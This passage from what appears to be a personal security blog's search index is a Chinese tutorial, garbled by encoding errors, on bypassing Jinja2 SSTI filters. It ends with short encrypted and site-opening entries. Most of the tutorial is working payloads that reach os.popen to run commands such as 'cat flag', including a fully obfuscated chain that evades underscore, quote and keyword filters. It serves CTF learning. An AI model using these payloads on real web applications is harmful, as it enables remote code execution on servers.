ç§ç»•è¿‡æ–¹å¼</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">1ã€ç”¨[]ä»£æ›¿.</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>[&#x27;__class&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">2ã€ç”¨attr()è¿‡æ»¤å™¨ç»•è¿‡</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡ _"></a>ç»•è¿‡ _</h2><p>å½“<code>_</code>è¢«banæ—¶ï¼Œæœ‰ä»¥ä¸‹å‡ ç§ç»•è¿‡æ–¹å¼</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">1ã€é€šè¿‡listè·å–å­—ç¬¦åˆ—è¡¨ï¼Œç„¶åç”¨popæ¥è·å–_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list).pop(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(a)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">2ã€å¯ä»¥é€šè¿‡å­—ç¬¦ç¼–ç çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œä¸¾ä¸ª16è¿›åˆ¶ç¼–ç ä¾‹å­ å¯ä»¥ç¼–ç ç»•è¿‡ pythonè§£æå™¨æ”¯æŒ hex ï¼Œunicodeç¼–ç </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125;</span><span class="language-xml"> =</span><span class="hljs-template-variable">&#123;&#123;().__class__&#125;&#125;</span><br></code></pre></td></tr></table></figure>ä½¿ç”¨{%set%}æ„é€ ä¸‹åˆ’çº¿<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">sb</span> = dict(aaaaaaaaaaaaaaaaaa=<span class="hljs-keyword">a</span>) | <span class="hljs-keyword">join</span> | <span class="hljs-built_in">count</span> %&#125;<br>&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">pop</span>=dict(<span class="hljs-keyword">pop</span>=<span class="hljs-keyword">a</span>)|<span class="hljs-keyword">join</span>%&#125;<br>&#123;% <span class="hljs-keyword">set</span> xiahuaxian = (lipsum | <span class="hljs-built_in">string</span> | <span class="hljs-keyword">list</span>) | attr(<span class="hljs-keyword">pop</span>)(<span class="hljs-keyword">sb</span>) %&#125;<br><br>å°æ ‡æŒ‰ç…§å®é™…æƒ…å†µå†™<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡-2"><a href="#ç»•è¿‡-2" class="headerlink" title="ç»•è¿‡ []"></a>ç»•è¿‡ []</h2><p>ç»å¸¸æœ‰ä¸­æ‹¬å·è¢«bançš„æƒ…å†µå‡ºç°ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨<code>pop</code>æˆ–<code>__getitem__()</code>ä»£æ›¿ç´¢å¼•ä¸­çš„&#96;[]ï¼Œå®ƒçš„ä½œç”¨ç®€å•è¯´å°±æ˜¯å¯ä»¥æŠŠä¸­æ‹¬å·è½¬æ¢ä¸ºæ‹¬å·çš„å½¢å¼ï¼Œä¸¾ä¸ªä¾‹å­</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__bases__</span>[0]=<span class="hljs-emphasis">__bases__</span>.<span class="hljs-emphasis">__getitem__</span>(0)<br></code></pre></td></tr></table></figure>## ç»•è¿‡{{}}æœ‰æ—¶å€™ä¸ºäº†é˜²æ­¢SSTIï¼Œå¯èƒ½ç¨‹åºå‘˜ä¼šbanæ‰{{ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨jinja2çš„è¯­æ³•ï¼Œç”¨{%æ¥è¿›è¡ŒRCEï¼Œä¸¾ä¸ªä¾‹å­æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„payload<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;dir&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åçš„payload</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;%print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]. <span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">138</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read())%&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å€ŸåŠ©forå¾ªç¯å’Œifè¯­å¥æ¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%print i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡å•å¼•å·åŒå¼•å·-ä¼ å‚ç»•è¿‡"><a href="#ç»•è¿‡å•å¼•å·åŒå¼•å·-ä¼ å‚ç»•è¿‡" class="headerlink" title="ç»•è¿‡å•å¼•å·åŒå¼•å·   ä¼ å‚ç»•è¿‡"></a>ç»•è¿‡å•å¼•å·åŒå¼•å·   ä¼ å‚ç»•è¿‡</h2><p>è¿‡æ»¤äº†å•ã€åŒå¼•å·ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡</p><p>requestç»•è¿‡</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#post</span><br><span class="language-xml"># __builtins__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[80].__init__.__globals__.__builtins__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).popen(<span class="hljs-name">request.values.arg3</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=__import__,arg2=os,arg3=popen</span><br><span class="language-xml"></span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"># os</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[213].__init__.__globals__[request.values.arg1].popen(<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#cookie</span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.cookies.arg1](<span class="hljs-name">request.cookies.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Cookie:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>chr()ç»•è¿‡</p><p>å…ˆæ‰¾å‡ºchrå‡½æ•°ä½ç½®</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__mro__</span>[-1].<span class="hljs-emphasis">__subclasses__</span>()[0].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.chr&#125;&#125;<br></code></pre></td></tr></table></figure>{%set%}æ‹¼æ¥ç»•è¿‡   é€‚åˆå¤§éƒ¨åˆ†è¿‡æ»¤<h2 id="ç»•è¿‡args"><a href="#ç»•è¿‡args" class="headerlink" title="ç»•è¿‡args"></a>ç»•è¿‡args</h2><p>å½“ä½¿ç”¨argsçš„æ–¹æ³•ç»•è¿‡<code>&#39;</code>å’Œ<code>&quot;</code>æ—¶ï¼Œå¯èƒ½é‡è§argsè¢«bançš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥é‡‡ç”¨<code>request.cookies</code>å’Œ<code>request.values</code>ï¼Œä»–ä»¬åˆ©ç”¨çš„æ–¹å¼å¤§åŒå°å¼‚ï¼Œç¤ºä¾‹å¦‚ä¸‹</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">GET:&#123;&#123;url_for.__globals__<span class="hljs-selector-attr">[request.cookies.a]</span>&#125;&#125;<br>COOkie: <span class="hljs-string">&quot;a&quot;</span> :<span class="hljs-string">&#x27;__builtins__&#x27;</span><br></code></pre></td></tr></table></figure>ä½¿ç”¨{%set%}æ‹¼æ¥ç»•è¿‡<h2 id="ç»•è¿‡æ•°å­—"><a href="#ç»•è¿‡æ•°å­—" class="headerlink" title="ç»•è¿‡æ•°å­—"></a>ç»•è¿‡æ•°å­—</h2><p>æœ‰æ—¶å€™å¯èƒ½ä¼šé‡è§æ•°å­—<code>0-9</code>è¢«bançš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥é€šè¿‡countæ¥å¾—åˆ°æ•°å­—ï¼Œä¸¾ä¸ªä¾‹å­</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">dict</span>(<span class="hljs-name">e</span>=a)|join|count)&#125;&#125;</span><span class="language-xml">  #è·å¾—å­—å…¸æ‹¼æ¥åå­—ç¬¦ä¸²çš„é•¿åº¦</span><br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡å…³é”®å­—"><a href="#ç»•è¿‡å…³é”®å­—" class="headerlink" title="ç»•è¿‡å…³é”®å­—"></a>ç»•è¿‡å…³é”®å­—</h2><p>æœ‰æ—¶å€™å¯èƒ½é‡è§<code>class</code>ã€<code>base</code>è¿™ç§å…³é”®è¯è¢«ç»•è¿‡çš„æƒ…å†µï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™é€šå¸¸ä½¿ç”¨çš„ç»•è¿‡æ–¹å¼æ˜¯ä½¿ç”¨joinæ‹¼æ¥ä»è€Œå®ç°ç»•è¿‡ï¼Œä¸¾ä¸ªä¾‹å­</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">dict</span>(<span class="hljs-name">__in</span>=a,<span class="hljs-attr">it__</span>=a)|join&#125;&#125;</span><span class="language-xml">  =__init__</span><br></code></pre></td></tr></table></figure><h1 id="SSTIå®æˆ˜"><a href="#SSTIå®æˆ˜" class="headerlink" title="SSTIå®æˆ˜"></a>SSTIå®æˆ˜</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ç›®çš„<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>payload:<br>&#123;% <span class="hljs-built_in">set</span> s = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> si = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> sb = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-attribute">pop</span>=dict(pop=a)|join%&#125;<br>&#123;% <span class="hljs-built_in">set</span> xiahuaxian = (lipsum | string | list) | attr(pop)(sb) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> a = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">glo</span>=a, <span class="hljs-attribute">bals</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> b = dict(<span class="hljs-attribute">o</span>=a, <span class="hljs-attribute">s</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c = dict(<span class="hljs-attribute">po</span>=a, <span class="hljs-attribute">pen</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> d = dict(<span class="hljs-attribute">re</span>=a, <span class="hljs-attribute">ad</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> e = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">get</span>=a, <span class="hljs-attribute">item</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> f = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">buil</span>=a, <span class="hljs-attribute">tins</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ch = dict(<span class="hljs-attribute">ch</span>=a, <span class="hljs-attribute">r</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> chh = lipsum | attr(a) | attr(e)(f) | attr(e)(ch) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd = (dict(<span class="hljs-attribute">ca</span>=a, <span class="hljs-attribute">t</span>=a) | join, chh(s), chh(si), dict(<span class="hljs-attribute">ap</span>=a, <span class="hljs-attribute">p</span>=a) | join, chh(si), dict(<span class="hljs-attribute">fl</span>=a, <span class="hljs-attribute">ag</span>=a) | join) | join %&#125;<br>&#123;&#123; lipsum | attr(a) | attr(e)(b) | attr(c)(cmd) | attr(d)() &#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é—®è‡ªå·±</title>
    <link href="/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/"/>
    <url>/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ceab957815d1b4c83f31e46006ce80c287aaafac373a6b841e7e6304f0abbcc0">7389a4e37e9dabc8af72228f567f583b1f9ba4b4aa0b937c90aaff86783f2f4cdc7fe0a2e060dc0fb69e0cfed97c5b2b02307e944f85197c10783a2e08b2ebab38f98c0635854736a7d4db8057147550382529547668fab013ade34f08eb873f4dfe405f4d5985ee706239b30f02b95c1e5cfe6be76c8cc844a2ce36f2afb02b1e4370944671f31986fac2146df9065a82e0db0d7d7754d95577499610e7d55b4db5e048307c3a119d14afa15db89d7796106ec767db66ecbf296ccd51ebec5b85d06521eb6672e74ebdb6b080b9ddd2079dd70a60c93ae9c6c31b3e4dc1019e48826abb08a06e7906f06427791b012adad6bfb36447f3206a6c421d39dffb2ec14024d056d0fc713c7ec6b790b8bb529c7b580fdb9ef82693bac3aa8aa2fc2d0bbbe11e3c418272b5cecbea4324cdbf9641e7fd455c2e10fc650df7f1a67bbe3003c435abcfbaafa6fb651c663806b571c78e9f8d45769d20ee999b4ed90585a9e69543e488880081374a78c64c4e984c24f71c66ff351882845be8a65f22c3569748c41e52a544e54a5c2a0c33c599217f07aea603c7a56d131ecb8593faa7f9654e2a6edc3ad74c09b04deab036ddb41dd202149ed60c8acc4eaa4a868f1d009df742e4ea103f8838074a4180ad038f09e7db4b546d7772190cff232c4c80dcad18f5d930d007afa2bb1eefceffa183b2b765009431851485d4b71d2194696af02dbb65e20caecdcb1c9c4c219de964d4bc57e8db004bf9e9f4abaa87c63bcf8f25c1b3bc403374090a6ffc4264d9ebc250a382bdabbb8f8889c946ee677b0f682acc22da1d847cc8faa3a30783db44ff527f1173fe78bf19587039e57a3a5d71312b5290632ef680733a6b15762e465f8341d5aa86f68624d9c1d135a186139c6b319f297b61c0ce963c238976a592703a2fbf20b3ec22b9f510a4fa39eefcb37fbd6db69ccf47bd3c14ad681060738b60ba78e67940feb5baff30b9830306f74747010f81c7fad05874109ee42f24c5a8697c3cc57bc50fb20449a2397d5cabed06e1a9944cd0a443b54b1a1116</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>ç›®æ ‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼€ç«™</title>
    <link href="/2024/11/12/%E5%BC%80%E7%AB%99/"/>
    <url>/2024/11/12/%E5%BC%80%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>æ­å»ºä¸€ä¸ªå°ç«™ï¼Œçºªå½•è‡ªå·±çš„å­¦ä¹ å’Œåˆ†äº«ä¸€äº›ä¸œè¥¿</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
